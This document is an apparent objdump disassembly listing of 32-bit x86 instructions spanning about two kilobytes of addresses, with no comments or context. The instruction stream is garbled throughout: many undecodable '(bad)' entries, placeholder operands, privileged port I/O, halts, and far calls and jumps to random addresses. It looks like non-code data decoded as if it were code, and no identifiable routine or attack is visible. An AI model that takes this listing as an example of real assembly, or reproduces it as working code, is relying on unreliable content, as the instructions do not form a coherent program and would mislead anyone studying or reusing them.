  4201fa:	xchg   esi,eax
  4201fb:	or     eax,0x109f2406
  420200:	sar    DWORD PTR [edi+eiz*2-0x6885b307],cl
  420207:	lods   al,BYTE PTR ds:[esi]
  420208:	sub    eax,0x28c1669
  42020d:	sub    edi,DWORD PTR [edi+0x6c5f169a]
  420213:	xor    DWORD PTR [ecx],0x5cb95c94
  420219:	jcxz   0x4201b1
  42021c:	jl     0x420222
  42021e:	enter  0x3673,0x7c
  420222:	mov    ds:0x1cb7e134,eax
  420227:	pop    edi
  420228:	mov    DWORD PTR [edx],ebp
  42022a:	imul   ebp,DWORD PTR [ebx],0x14
  42022d:	xchg   ecx,eax
  42022e:	push   eax
  42022f:	sbb    DWORD PTR [ebp-0x195a4382],esp
  420235:	or     dl,bl
  420237:	mov    dh,0x3e
  420239:	mov    bh,0xa
  42023b:	adc    eax,0x3452c10
  420240:	push   cs
  420241:	mov    ds:0xd9c08ef0,eax
  420246:	je     0x42028a
  420248:	push   ss
  420249:	fistp  WORD PTR [edi-0x6b]
  42024c:	xlat   BYTE PTR ds:[ebx]
  42024d:	xchg   ebx,eax
  42024e:	call   0x8a9edbcd
  420253:	push   ebp
  420254:	xor    edi,DWORD PTR [edi+0x6dc71ce1]
  42025a:	ret    0x1735
  42025d:	cmp    dl,BYTE PTR [edi-0x2a7b8dc4]
  420263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420264:	adc    DWORD PTR [ebp+0x3c],edx
  420267:	jnp    0x42020d
  420269:	lea    esp,[esi]
  42026b:	mov    edi,0xd924baa
  420270:	xor    eax,0x347c78ae
  420275:	fisttp QWORD PTR [eax-0x74c31d7f]
  42027b:	inc    ebp
  42027c:	push   cs
  42027d:	mov    ds:0x77e9fbc5,al
  420282:	(bad)  
  420283:	(bad)  
  420284:	scas   al,BYTE PTR es:[edi]
  420285:	xlat   BYTE PTR ds:[ebx]
  420286:	inc    DWORD PTR [edx+0x3f]
  420289:	cmp    dh,cl
  42028b:	cmc    
  42028c:	lea    ecx,[ecx+0x5a1ba7ee]
  420292:	add    bl,dh
  420294:	or     al,0xdc
  420296:	fwait
  420297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420298:	aas    
  420299:	cwde   
  42029a:	push   0x31
  42029c:	scas   eax,DWORD PTR es:[edi]
  42029d:	mov    ah,0xae
  42029f:	xchg   esi,eax
  4202a0:	mov    dl,0xac
  4202a2:	push   edx
  4202a3:	or     eax,0x22ae1352
  4202a8:	cmp    dl,cl
  4202aa:	and    BYTE PTR [edx-0x2a2c0b9f],0xd9
  4202b1:	push   es
  4202b2:	dec    ecx
  4202b3:	out    0xb0,eax
  4202b5:	rol    BYTE PTR [edi],0xcf
  4202b8:	mov    ebp,?
  4202ba:	and    edi,DWORD PTR [eax]
  4202bc:	pop    ebp
  4202bd:	ret    
  4202be:	scas   al,BYTE PTR es:[edi]
  4202bf:	pop    es
  4202c0:	pop    edx
  4202c1:	sub    esi,DWORD PTR [ebp-0x71]
  4202c4:	cdq    
  4202c5:	retf   
  4202c6:	fstp   TBYTE PTR [edi-0x75e519e5]
  4202cc:	outs   dx,DWORD PTR ds:[esi]
  4202cd:	push   esp
  4202ce:	icebp  
  4202cf:	nop
  4202d0:	movzx  esi,WORD PTR [edi]
  4202d3:	inc    ecx
  4202d4:	jns    0x420334
  4202d6:	add    DWORD PTR [esi-0x243ee5ef],eax
  4202dc:	mov    eax,ds:0x7526c944
  4202e1:	mov    ds:0x50ef8129,eax
  4202e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e7:	in     al,dx
  4202e8:	push   edi
  4202e9:	dec    esp
  4202ea:	std    
  4202eb:	sub    DWORD PTR [ebp+0x56b03291],ecx
  4202f1:	(bad)  
  4202f3:	jmp    0xac081eac
  4202f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202f9:	loope  0x4202b4
  4202fb:	in     al,dx
  4202fc:	mov    dh,0x63
  4202fe:	out    0x4a,al
  420300:	repz push 0x53
  420303:	ret    0x4b40
  420306:	or     bh,BYTE PTR ds:0x42dd16b1
  42030c:	push   0xfffffff3
  42030e:	sbb    bl,BYTE PTR [ebx-0x5b28b20a]
  420314:	fldenv [esi+ecx*4-0x78]
  420318:	pop    esp
  420319:	aad    0xde
  42031b:	fmul   QWORD PTR [ecx+0x4]
  42031e:	pop    ebx
  42031f:	dec    esi
  420320:	arpl   WORD PTR [esi+0x4163fffe],bp
  420326:	and    BYTE PTR [ebx+esi*8],0x87
  42032a:	shl    DWORD PTR [ebp+0x7a1dc183],0xe9
  420331:	or     BYTE PTR [edx-0x54],ah
  420334:	xchg   edi,eax
  420335:	dec    esi
  420336:	das    
  420337:	scas   al,BYTE PTR es:[edi]
  420338:	or     ebp,DWORD PTR [esi]
  42033a:	sti    
  42033b:	cmc    
  42033c:	jb     0x420328
  42033e:	outs   dx,DWORD PTR ds:[esi]
  42033f:	inc    ebp
  420340:	out    dx,al
  420341:	cmp    eax,0x34081d39
  420346:	fidivr WORD PTR [ecx-0x5328f7a0]
  42034c:	ins    DWORD PTR es:[edi],dx
  42034d:	xor    eax,0x910a9b96
  420352:	mov    cl,0x29
  420354:	sbb    eax,eax
  420356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420357:	out    dx,al
  420358:	sar    BYTE PTR [eax],cl
  42035a:	push   ebx
  42035b:	jno    0x4203bc
  42035d:	mov    BYTE PTR [ebx-0x4555adec],ch
  420363:	pusha  
  420364:	add    ah,ch
  420366:	fucom  st(5)
  420368:	mov    eax,ds:0x1127b1ff
  42036d:	dec    edx
  42036e:	mov    esp,0xa882417d
  420373:	pop    es
  420374:	mov    ds:0xdae09f72,eax
  420379:	scas   al,BYTE PTR es:[edi]
  42037a:	or     al,0xb1
  42037c:	call   DWORD PTR [ebx]
  42037e:	jns    0x4203dd
  420380:	mov    bh,cl
  420382:	adc    bh,BYTE PTR [eax]
  420384:	adc    eax,0xfdfc2c98
  420389:	sbb    bl,BYTE PTR [edi-0x775ef7f7]
  42038f:	mov    cl,0xf4
  420391:	cmp    al,0x42
  420393:	adc    eax,0x341e6d88
  420398:	inc    esi
  420399:	sahf   
  42039a:	clc    
  42039b:	cwde   
  42039c:	pop    edi
  42039d:	pop    esi
  42039e:	xchg   ebx,eax
  42039f:	inc    ecx
  4203a0:	mov    bh,0x7
  4203a2:	add    edi,ebp
  4203a4:	add    bl,dh
  4203a6:	aad    0x20
  4203a8:	jnp    0x4203a0
  4203aa:	in     eax,0xc8
  4203ac:	xchg   ebx,eax
  4203ad:	stc    
  4203ae:	fucomip st,st(7)
  4203b0:	cli    
  4203b1:	mov    bl,0x2e
  4203b3:	loope  0x4203fb
  4203b5:	mov    bl,0x8d
  4203b7:	xchg   esp,eax
  4203b8:	sub    DWORD PTR [ebx-0x6c],ecx
  4203bb:	jbe    0x420344
  4203bd:	dec    ecx
  4203be:	(bad)  
  4203bf:	fst    st(7)
  4203c1:	push   cs
  4203c2:	call   0x89e0d090
  4203c7:	cmp    eax,0xfa9112c1
  4203cc:	rol    ebx,cl
  4203ce:	lods   al,BYTE PTR ds:[esi]
  4203cf:	xchg   esi,eax
  4203d0:	adc    BYTE PTR [eax],bl
  4203d2:	ja     0x4203ce
  4203d4:	pop    es
  4203d5:	mov    ah,0xc6
  4203d7:	dec    esp
  4203d8:	repz push esp
  4203da:	pop    esi
  4203db:	and    BYTE PTR [ecx],bh
  4203dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203de:	test   al,0x19
  4203e0:	stc    
  4203e1:	mov    ebx,0x6c40793a
  4203e6:	sub    bl,BYTE PTR [ebx-0x1f6db8a1]
  4203ec:	mov    DWORD PTR [edx-0x53fe9bcd],0x250ad406
  4203f6:	jne    0x4203e3
  4203f8:	mov    edx,0x2b4b7fed
  4203fd:	adc    dl,BYTE PTR [esi]
  4203ff:	fadd   QWORD PTR [eax-0x74828771]
  420405:	cmp    DWORD PTR [ecx],ebx
  420407:	outs   dx,BYTE PTR ds:[esi]
  420408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420409:	xchg   ah,ah
  42040b:	hlt    
  42040c:	rcl    BYTE PTR [edi],cl
  42040e:	sbb    al,0x7d
  420410:	ins    DWORD PTR es:[edi],dx
  420411:	mov    esi,0x6da6b1ef
  420416:	mov    esi,0xd8fbe3a3
  42041b:	xor    dl,BYTE PTR [ecx]
  42041d:	inc    ecx
  42041e:	test   eax,0x49091054
  420423:	rol    BYTE PTR [esi+0x2add830d],cl
  420429:	push   ebx
  42042a:	inc    eax
  42042b:	mov    cl,0x92
  42042d:	jge    0x420404
  42042f:	mov    ds:0x2b809f51,al
  420434:	xor    BYTE PTR [ecx+0x4c],0xe4
  420438:	xor    eax,0xd03be1d
  42043d:	pop    ebp
  42043e:	xchg   edi,eax
  42043f:	fadd   DWORD PTR [eax-0x1a6dfa6b]
  420445:	xchg   ecx,eax
  420446:	not    DWORD PTR [bx+di]
  420449:	rcr    BYTE PTR [esi],0xd0
  42044c:	and    ecx,edi
  42044e:	push   0x1
  420450:	jns    0x4203ec
  420452:	sub    eax,0x26a46059
  420457:	or     DWORD PTR [eax+0x57],ebp
  42045a:	int3   
  42045b:	dec    ecx
  42045c:	xchg   edx,eax
  42045d:	loopne 0x42041e
  42045f:	xchg   ebp,eax
  420460:	mov    bh,0xa
  420462:	and    al,0x37
  420464:	shl    ch,0x17
  420467:	fisub  WORD PTR [esi]
  420469:	sbb    eax,0xb13df80c
  42046e:	imul   esp,DWORD PTR [esp+esi*1],0x8124eb37
  420475:	retf   0xa368
  420478:	xlat   BYTE PTR ds:[ebx]
  420479:	or     al,0xb4
  42047b:	xlat   BYTE PTR ds:[ebx]
  42047c:	dec    edi
  42047d:	ret    0xbac4
  420480:	adc    ch,BYTE PTR [edx+esi*1]
  420483:	adc    al,0xb
  420485:	int3   
  420486:	and    esi,eax
  420488:	or     DWORD PTR [esi-0x57],edx
  42048b:	ret    0x54d0
  42048e:	retf   0x6a98
  420491:	sbb    esp,esi
  420493:	sub    DWORD PTR [ebx+0x37],eax
  420496:	sbb    esi,DWORD PTR [esi-0x26]
  420499:	or     BYTE PTR ds:0x9a1a74a,bh
  42049f:	fnsave [ecx-0x1a]
  4204a2:	adc    DWORD PTR [eax],esp
  4204a4:	scas   eax,DWORD PTR es:[edi]
  4204a5:	add    eax,0x18eaca88
  4204aa:	jo     0x4204f5
  4204ac:	push   esi
  4204ad:	dec    eax
  4204ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204af:	xchg   ebx,edi
  4204b1:	jbe    0x4204bc
  4204b3:	and    al,0xfa
  4204b5:	push   ss
  4204b6:	adc    BYTE PTR [eax-0x209716c1],bl
  4204bc:	xchg   esp,eax
  4204bd:	fmul   QWORD PTR [edi+ebx*4]
  4204c0:	dec    esp
  4204c1:	jmp    0xfc222d3a
  4204c6:	inc    ebp
  4204c7:	inc    ebx
  4204c8:	pop    eax
  4204c9:	loope  0x420548
  4204cb:	mov    ch,0x7b
  4204cd:	jmp    0xbb390f4a
  4204d2:	fdiv   DWORD PTR [ecx+0x4c6e7b38]
  4204d8:	mov    ah,0x30
  4204da:	fild   DWORD PTR [edx+0x70f717c7]
  4204e0:	mov    eax,0x5c50762e
  4204e5:	jns    0x42054c
  4204e7:	adc    esi,DWORD PTR [eax-0x12c692dc]
  4204ed:	sub    ebx,DWORD PTR [ecx]
  4204ef:	mov    al,0x17
  4204f1:	jg     0x420483
  4204f3:	ja     0x4204c5
  4204f5:	or     ecx,esi
  4204f7:	sub    esp,DWORD PTR [ecx]
  4204f9:	adc    DWORD PTR [esi+edx*8+0x77],ebp
  4204fd:	and    eax,0x15a4a3f7
  420502:	call   0x7848b1ee
  420507:	xor    BYTE PTR [esi-0x1b],dl
  42050a:	outs   dx,DWORD PTR ds:[esi]
  42050b:	cmp    BYTE PTR [esi+edx*2+0x63],0x5a
  420510:	loop   0x42057d
  420512:	or     esi,DWORD PTR [eax-0x477c7e3a]
  420518:	out    0x3c,eax
  42051a:	xor    BYTE PTR [edi-0x27],bl
  42051d:	daa    
  42051e:	cs out dx,eax
  420520:	xchg   esp,eax
  420521:	or     ch,BYTE PTR [edi+0x3f]
  420524:	aaa    
  420525:	push   es
  420526:	mov    ?,WORD PTR [ecx+0x442f3ef3]
  42052c:	mov    edi,0x23c7ddd2
  420531:	addr16 sbb esp,edx
  420534:	neg    DWORD PTR [eax]
  420536:	es push eax
  420538:	jle    0x420506
  42053a:	xchg   ebx,eax
  42053b:	neg    DWORD PTR [edi]
  42053d:	pop    ebp
  42053e:	jecxz  0x420505
  420540:	in     al,0x2
  420542:	push   esp
  420543:	in     al,dx
  420544:	out    0xbe,eax
  420546:	fild   QWORD PTR [ecx+0x7d]
  420549:	or     BYTE PTR [ebp-0x26],bh
  42054c:	aaa    
  42054d:	add    al,0xc5
  42054f:	xor    eax,0x2ae93e4
  420554:	rcl    BYTE PTR [ecx],0x1c
  420557:	sub    al,0x5d
  420559:	outs   dx,BYTE PTR ds:[esi]
  42055a:	xchg   ebp,eax
  42055b:	hlt    
  42055c:	jg     0x42051e
  42055e:	push   esi
  42055f:	cs xchg edx,eax
  420561:	ins    DWORD PTR es:[edi],dx
  420562:	pushf  
  420563:	iret   
  420564:	xor    ah,BYTE PTR [ebx+0x52]
  420567:	repnz arpl WORD PTR [eax*1-0x34e912b2],bp
  42056f:	outs   dx,BYTE PTR ds:[esi]
  420570:	and    esp,edi
  420572:	neg    BYTE PTR [edi-0x42]
  420575:	fsubr  DWORD PTR [edx+0x4e]
  420578:	mov    edi,0x76202476
  42057d:	retf   
  42057e:	push   eax
  42057f:	push   cs
  420580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420581:	dec    edi
  420582:	jo     0x4205f0
  420584:	push   esp
  420585:	adc    bh,BYTE PTR [eax-0x15]
  420588:	mov    esp,0x8ef3ed37
  42058d:	adc    cl,BYTE PTR [edx]
  42058f:	dec    edx
  420590:	std    
  420591:	nop
  420592:	or     BYTE PTR [esi],ah
  420594:	sahf   
  420595:	ret    
  420596:	sbb    al,0x7d
  420598:	in     al,0xc2
  42059a:	or     ebx,DWORD PTR [ebp+0x2]
  42059d:	cld    
  42059e:	push   di
  4205a0:	daa    
  4205a1:	popf   
  4205a2:	mov    eax,0xafbfed08
  4205a7:	xlat   BYTE PTR ds:[ebx]
  4205a8:	add    edi,DWORD PTR [edx]
  4205aa:	add    eax,DWORD PTR [ebx+0x3e783908]
  4205b0:	ss dec ecx
  4205b2:	repnz inc edx
  4205b4:	int    0x6b
  4205b6:	mov    ecx,0x46bf27a6
  4205bb:	scas   eax,DWORD PTR es:[edi]
  4205bc:	jbe    0x420618
  4205be:	es mov edx,0xf68a67e
  4205c4:	mov    ds:0x7a21e7cc,eax
  4205c9:	mov    edx,0xedb59f57
  4205ce:	(bad)  
  4205cf:	(bad)  
  4205d0:	adc    al,0x63
  4205d2:	jmp    0xc276:0xf9514192
  4205d9:	jp     0x42064e
  4205db:	fistp  DWORD PTR [eax+0xa]
  4205de:	ret    
  4205df:	dec    esi
  4205e0:	into   
  4205e1:	sbb    ch,BYTE PTR [ebx+0x234636e4]
  4205e7:	or     eax,DWORD PTR [edx]
  4205e9:	fadd   QWORD PTR [ebx-0x10006cc7]
  4205ef:	lds    edi,FWORD PTR [ecx-0xd45aafa]
  4205f5:	xor    DWORD PTR [eax],0x62
  4205f8:	mov    eax,0xfcdb5032
  4205fd:	retf   
  4205fe:	in     eax,0xda
  420600:	stc    
  420601:	cmp    cl,ch
  420603:	mov    edi,0x8a42a6b4
  420608:	push   edx
  420609:	mov    ds:0x574d5cde,al
  42060e:	cwde   
  42060f:	or     eax,DWORD PTR [ebx+0x6c]
  420612:	pop    edi
  420613:	pop    edx
  420614:	in     eax,dx
  420615:	mov    ds:0x7e7b5fdf,eax
  42061a:	cmp    BYTE PTR [ecx],al
  42061c:	lds    esi,FWORD PTR [ecx]
  42061e:	sbb    eax,0x675af849
  420623:	pop    ds
  420624:	xchg   ebp,eax
  420625:	pop    edx
  420626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420627:	aam    0x81
  420629:	lods   eax,DWORD PTR ds:[esi]
  42062a:	loop   0x420644
  42062c:	adc    edx,DWORD PTR [edx+0x74]
  42062f:	add    ah,0x8a
  420632:	push   cs
  420633:	and    DWORD PTR [eax-0x1c],esi
  420636:	push   ecx
  420637:	push   cs
  420638:	sbb    BYTE PTR cs:[ebx+edi*4+0x4c],cl
  42063d:	push   es
  42063e:	xor    eax,0x3eb2033c
  420643:	fimul  WORD PTR [ecx]
  420645:	stc    
  420646:	mov    BYTE PTR [ebp+0x5894bf7],dh
  42064c:	test   al,0xb9
  42064e:	jb     0x42062d
  420650:	sub    ch,BYTE PTR [esi-0xe]
  420653:	into   
  420654:	sbb    edi,DWORD PTR [edx]
  420656:	test   edi,edi
  420658:	cwde   
  420659:	mov    ebp,0x6a148357
  42065e:	jle    0x420635
  420660:	mov    ecx,0x67c3bc92
  420665:	gs data16 sahf 
  420668:	xor    eax,0xd94d89bf
  42066d:	dec    edx
  42066e:	cwde   
  42066f:	add    bh,BYTE PTR [edx-0x3481d466]
  420675:	in     al,dx
  420676:	imul   esp,ebx,0xffffffac
  420679:	sub    eax,0x68d412c6
  42067e:	cmp    ah,BYTE PTR [ecx]
  420680:	in     al,dx
  420681:	ins    BYTE PTR es:[edi],dx
  420682:	or     al,0x95
  420684:	cmp    esp,DWORD PTR [edi+ebp*4+0x62183c3]
  42068b:	nop
  42068c:	jmp    0x701e8976
  420691:	dec    edi
  420692:	hlt    
  420693:	mov    ah,0x1d
  420695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420696:	imul   eax,ebp
  420699:	(bad)  [ebp-0x28465788]
  42069f:	and    BYTE PTR [esi+0x533c18fd],ch
  4206a5:	and    ecx,DWORD PTR [eax]
  4206a7:	or     al,0xfe
  4206a9:	mov    esi,0xdc1ad134
  4206ae:	out    dx,eax
  4206af:	hlt    
  4206b0:	(bad)  
  4206b1:	or     dl,BYTE PTR [eax]
  4206b3:	sub    eax,ebx
  4206b5:	fld    QWORD PTR [edi]
  4206b7:	and    eax,0x57e5dae7
  4206bc:	adc    BYTE PTR [ebx],dl
  4206be:	cmp    eax,0x6b828835
  4206c3:	bound  eax,QWORD PTR [ecx-0x1c]
  4206c6:	mov    ds:0x5fbc3cc5,eax
  4206cb:	add    al,0x86
  4206cd:	sbb    eax,0x61c2ed99
  4206d2:	xchg   BYTE PTR [esi+0x448cd366],ch
  4206d8:	out    0xb6,eax
  4206da:	inc    ecx
  4206db:	mov    dh,BYTE PTR [ebp-0x748c2fa9]
  4206e1:	ficomp WORD PTR [edx]
  4206e3:	push   edx
  4206e4:	jno    0x42074e
  4206e6:	(bad)  
  4206e7:	adc    dh,BYTE PTR [ebx]
  4206e9:	lea    esi,[esi+eiz*1-0x6c]
  4206ed:	push   ss
  4206ee:	mov    BYTE PTR [esi-0x1],bl
  4206f1:	js     0x4206c8
  4206f3:	je     0x420756
  4206f5:	sub    eax,0xa5af9e7d
  4206fa:	mov    dh,0xad
  4206fc:	push   eax
  4206fd:	jmp    0x4206a4
  4206ff:	jmp    0x932d:0x4c5b63d3
  420706:	mov    edi,0x4b0d119d
  42070b:	push   es
  42070c:	push   ds
  42070d:	sbb    ch,BYTE PTR [eax]
  42070f:	jl     0x420784
  420711:	pop    es
  420712:	icebp  
  420713:	rcr    ebx,1
  420715:	push   edx
  420716:	jg     0x420797
  420718:	xor    al,0x4c
  42071a:	fbstp  TBYTE PTR [edi-0x21]
  42071d:	inc    ebp
  42071e:	mov    ch,0xdb
  420720:	inc    ebp
  420721:	sub    eax,0x64df2ad9
  420726:	cld    
  420727:	call   0xeb91:0x9259800b
  42072e:	sbb    DWORD PTR ds:0x9d371a6b,0xffffffdf
  420735:	test   al,0xd4
  420737:	push   edi
  420738:	mov    esp,DWORD PTR [ebx]
  42073a:	mov    edx,0x93daa7ed
  42073f:	jecxz  0x42075f
  420741:	outs   dx,BYTE PTR ds:[esi]
  420742:	jno    0x4207b7
  420744:	jp     0x42070b
  420746:	rol    esi,cl
  420748:	fld    QWORD PTR [edi+0x30]
  42074b:	test   eax,0x81d0069f
  420750:	mov    edx,0x6fae19a6
  420755:	es jo  0x4206f4
  420758:	sub    BYTE PTR [esi],dh
  42075a:	shl    DWORD PTR [ebx],cl
  42075c:	fldcw  WORD PTR [esi-0x2bedd7b9]
  420762:	xor    BYTE PTR [ebp-0x27],bh
  420765:	in     al,0x4
  420767:	sub    eax,0xbb678558
  42076c:	mov    bh,0x44
  42076e:	adc    BYTE PTR [ebx-0x407605a9],ah
  420774:	hlt    
  420775:	lods   al,BYTE PTR ds:[esi]
  420776:	lea    esp,[edx+0x3a]
  420779:	imul   esp,DWORD PTR [eax],0x17
  42077c:	out    0x52,al
  42077e:	cdq    
  42077f:	xor    al,0xa0
  420781:	outs   dx,DWORD PTR ds:[esi]
  420782:	pop    eax
  420783:	addr16 aas 
  420785:	test   BYTE PTR [esi-0x9],dh
  420788:	iret   
  420789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42078a:	lods   al,BYTE PTR ds:[esi]
  42078b:	adc    BYTE PTR ds:0x1ef7304,cl
  420791:	mov    bl,0x38
  420793:	dec    esi
  420794:	dec    esp
  420795:	and    DWORD PTR [edx+edi*4],eax
  420798:	cmp    BYTE PTR cs:[ecx+0x50],bl
  42079c:	and    ebx,DWORD PTR [edi-0x31de91a6]
  4207a2:	scas   eax,DWORD PTR es:[edi]
  4207a3:	test   DWORD PTR [esi+0x18],esp
  4207a6:	lock test al,0x6
  4207a9:	pop    ebp
  4207aa:	sbb    BYTE PTR [ecx-0x29],ch
  4207ad:	or     DWORD PTR [ebp-0x7e],ebx
  4207b0:	jmp    0x4207b7
  4207b2:	and    eax,DWORD PTR [ebp-0x4b]
  4207b5:	add    al,0xbb
  4207b7:	sahf   
  4207b8:	mov    bl,BYTE PTR [ebp+0x3756ecaf]
  4207be:	cmp    dh,BYTE PTR [eax-0x38]
  4207c1:	bound  esp,QWORD PTR [edi]
  4207c3:	or     eax,0x15884bdf
  4207c8:	add    ecx,DWORD PTR [esi+ebp*8-0x19c3c37f]
  4207cf:	push   esp
  4207d0:	mov    gs,WORD PTR [edi]
  4207d2:	retf   
  4207d3:	fistp  DWORD PTR [ecx-0x6]
  4207d6:	(bad)  
  4207d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207d8:	fstp   QWORD PTR [esi-0x11]
  4207db:	and    esi,DWORD PTR [edx+0x43]
  4207de:	aad    0xc6
  4207e0:	leave  
  4207e1:	mov    al,ds:0xd4dfcf43
  4207e6:	inc    eax
  4207e7:	xor    DWORD PTR [ecx],edx
  4207e9:	in     eax,0x53
  4207eb:	(bad)  
  4207ec:	pop    esp
  4207ed:	jbe    0x42085e
  4207ef:	loopne 0x420854
  4207f1:	jbe    0x42086e
  4207f3:	and    bh,BYTE PTR [ecx+0x3499dafc]
  4207f9:	pop    es
  4207fa:	dec    eax
  4207fb:	(bad)  
  4207fc:	adc    eax,DWORD PTR [esi+0x49]
  4207ff:	xchg   esi,eax
  420800:	jno    0x420814
  420802:	hlt    
  420803:	ins    BYTE PTR es:[edi],dx
  420804:	xor    ebp,DWORD PTR [ebx+0x2be7e2c0]
  42080a:	test   eax,0x677fd942
  42080f:	mov    al,0x81
  420811:	sbb    DWORD PTR [edx-0x40],0x59aa7791
  420818:	jbe    0x4207c8
  42081a:	xor    BYTE PTR [ecx],bh
  42081c:	add    eax,DWORD PTR [edx]
  42081e:	dec    eax
  42081f:	ins    BYTE PTR es:[edi],dx
  420820:	leave  
  420821:	push   esi
  420822:	inc    esi
  420823:	push   ss
  420824:	test   al,0x34
  420826:	xchg   edx,eax
  420827:	scas   eax,DWORD PTR es:[edi]
  420828:	out    0x28,al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xb304921e
  420837:	lods   al,BYTE PTR ds:[esi]
  420838:	jb     0x42087e
  42083a:	jo     0x4207d3
  42083c:	add    DWORD PTR [eax],eax
  42083e:	mov    BYTE PTR [esi],al
  420840:	add    BYTE PTR [eax],al
  420842:	daa    
  420843:	retf   0xc917
  420846:	mov    bl,0x9a
  420848:	or     ebp,ebp
  42084a:	add    eax,0x50d02fd0
  42084f:	inc    esi
  420850:	mov    edx,0x952b65ac
  420855:	aam    0x35
  420857:	cs mov ebx,0x1fafa28f
  42085d:	pop    ds
  42085e:	lea    edx,[esi]
  420860:	ret    0x294c
  420863:	mov    ah,0x8e
  420865:	es in  al,0x6d
  420868:	(bad)  
  420869:	fbld   TBYTE PTR [edi+ebp*2-0x3e]
  42086d:	call   0x4a813f0d
  420872:	cli    
  420873:	std    
  420874:	mov    eax,ds:0x84abcb9c
  420879:	xchg   esi,eax
  42087a:	lods   al,BYTE PTR ds:[esi]
  42087b:	add    ebx,esi
  42087d:	call   0x914c:0xee8f882
  420884:	xor    al,BYTE PTR [ecx]
  420886:	adc    edi,DWORD PTR [ebp-0x2a2b835c]
  42088c:	mov    esi,0x67fec618
  420891:	dec    ebx
  420892:	jns    0x42088c
  420894:	clc    
  420895:	add    eax,0xdb5ddddf
  42089a:	jne    0x420825
  42089c:	clc    
  42089d:	push   ebx
  42089e:	or     al,0x4e
  4208a0:	pop    es
  4208a1:	loopne 0x42087d
  4208a3:	mov    bl,0x8e
  4208a5:	pop    ds
  4208a6:	xor    al,0x29
  4208a8:	ins    DWORD PTR es:[edi],dx
  4208a9:	(bad)  
  4208aa:	dec    ebp
  4208ab:	aam    0x8b
  4208ad:	div    BYTE PTR [esi]
  4208af:	mov    ecx,?
  4208b1:	mov    ebp,0x4573174
  4208b6:	outs   dx,DWORD PTR ds:[esi]
  4208b7:	add    esi,DWORD PTR [eax+edx*1-0x687af561]
  4208be:	inc    esi
  4208bf:	jl     0x42089d
  4208c1:	push   0x17ec20fc
  4208c6:	push   esp
  4208c7:	push   esp
  4208c8:	repnz mov ds:0x3b4e1d32,al
  4208ce:	arpl   WORD PTR [edi+0x28],cx
  4208d1:	sbb    eax,0x146d44f8
  4208d6:	push   eax
  4208d7:	push   ebx
  4208d8:	sbb    ah,bl
  4208da:	mov    BYTE PTR [ebp-0x57],0xb6
  4208de:	mov    ecx,0xa78f5c82
  4208e3:	call   0xbae6:0x8a3198d0
  4208ea:	push   eax
  4208eb:	cs std 
  4208ed:	push   ds
  4208ee:	xlat   BYTE PTR ds:[ebx]
  4208ef:	mov    bh,0x68
  4208f1:	fdiv   QWORD PTR [edi-0x2c95dd99]
  4208f7:	arpl   WORD PTR [edi],di
  4208f9:	mov    al,0x1b
  4208fb:	(bad)  
  4208fc:	scas   eax,DWORD PTR es:[edi]
  4208fd:	popa   
  4208fe:	jne    0x4208c4
  420900:	xchg   ebp,eax
  420901:	push   eax
  420902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420903:	adc    al,0xca
  420905:	push   cs
  420906:	jno    0x4208a1
  420908:	mov    esi,0xffca4a1e
  42090d:	int3   
  42090e:	call   0xc8adac7f
  420913:	jecxz  0x42096f
  420915:	xor    eax,0x5b039b10
  42091a:	xchg   ch,bl
  42091c:	ds xchg edi,eax
  42091e:	mov    eax,0xaae1eb06
  420923:	lods   al,BYTE PTR ds:[esi]
  420924:	add    dl,bl
  420926:	mov    bh,0x78
  420928:	push   ss
  420929:	mov    al,BYTE PTR [esi+esi*4-0xda74731]
  420930:	push   ss
  420931:	pop    ebx
  420932:	das    
  420933:	pusha  
  420934:	push   edx
  420935:	pop    esi
  420936:	cdq    
  420937:	jp     0x4208c4
  420939:	mov    esi,0x6df9b0b0
  42093e:	sar    al,1
  420940:	stos   BYTE PTR es:[edi],al
  420941:	daa    
  420942:	inc    esp
  420943:	jo     0x4208d2
  420945:	jmp    0x42092c
  420947:	dec    ebx
  420948:	call   0xb49d:0xb8884d78
  42094f:	add    BYTE PTR [edi],bl
  420951:	daa    
  420952:	pop    ss
  420953:	add    DWORD PTR [ecx+0x305762b5],edx
  420959:	mov    eax,ds:0x84cd8670
  42095e:	xchg   al,ch
  420960:	xor    al,0x4f
  420962:	pusha  
  420963:	dec    edx
  420964:	adc    DWORD PTR [ecx+0x0],ecx
  420967:	fcmovnbe st,st(3)
  420969:	adc    eax,0x7ec81c1b
  42096e:	out    0x9d,al
  420970:	arpl   bx,dx
  420972:	shl    BYTE PTR [ebx+0x1acacc5e],cl
  420978:	sar    DWORD PTR [ecx-0x12],cl
  42097b:	idiv   DWORD PTR [ebp-0x733edb3b]
  420981:	test   al,al
  420983:	aad    0x71
  420985:	sub    DWORD PTR [ebp-0x460405f9],ebp
  42098b:	stc    
  42098c:	(bad)  
  42098d:	push   ss
  42098e:	stos   DWORD PTR es:[edi],eax
  42098f:	ret    0xa27a
  420992:	sub    eax,0xdaad13d1
  420997:	jecxz  0x42093c
  420999:	lds    eax,FWORD PTR [ebp+0x5e]
  42099c:	pop    ss
  42099d:	and    DWORD PTR [ecx+esi*8-0x34b36fd8],ebp
  4209a4:	cmp    al,0x5f
  4209a6:	jp     0x42093e
  4209a8:	pop    edi
  4209a9:	and    edx,esp
  4209ab:	test   al,0x4
  4209ad:	aaa    
  4209ae:	lock adc eax,0xc8786ea5
  4209b4:	push   edx
  4209b5:	inc    esi
  4209b6:	in     eax,dx
  4209b7:	or     edx,DWORD PTR [esi+eiz*4-0x66f7c691]
  4209be:	jle    0x420a07
